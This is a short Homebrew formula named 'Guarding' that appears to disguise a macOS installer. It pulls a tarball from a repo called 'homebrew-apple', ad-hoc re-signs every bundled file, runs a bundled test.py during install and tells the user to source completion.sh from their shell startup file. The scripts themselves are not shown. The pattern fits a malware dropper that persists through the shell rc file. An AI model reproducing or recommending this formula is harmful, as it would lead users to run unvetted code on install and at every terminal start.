class Guarding < Formula
    desc "RC"
    homepage "https://github.com/cirillo/"
    url "https://github.com/cirillo/homebrew-apple/raw/refs/heads/main/guarding-1.0.4.tar.gz"
            
    sha256 "526400766f7a5606636ab9dc711bc39d477591003eace73f06921be5f1660005"
    version "1.0.4"
    
    depends_on "python@3.13" => [:build, :test]

    def python3
        which("python3.13")
    end

    def install
        bin.install Dir["*"]
        Dir["#{bin}/*"].each do |f|
        system "codesign", "--force", "--sign", "-", f if File.file?(f)
        end
    
        system python3, "-m", "venv", "--system-site-packages", "--without-pip", "#{libexec}"
        system "#{libexec}/bin/python", "#{bin}/test.py"
        #system "#{libexec}/bin/python", "#{bin}/py.py"
      end

    def caveats
        <<~EOS
        To finish installation, add the following line to .zshrc or .bashrc  
  source #{bin}/completion.sh
Then reopen your terminal app
        EOS
    end
    end
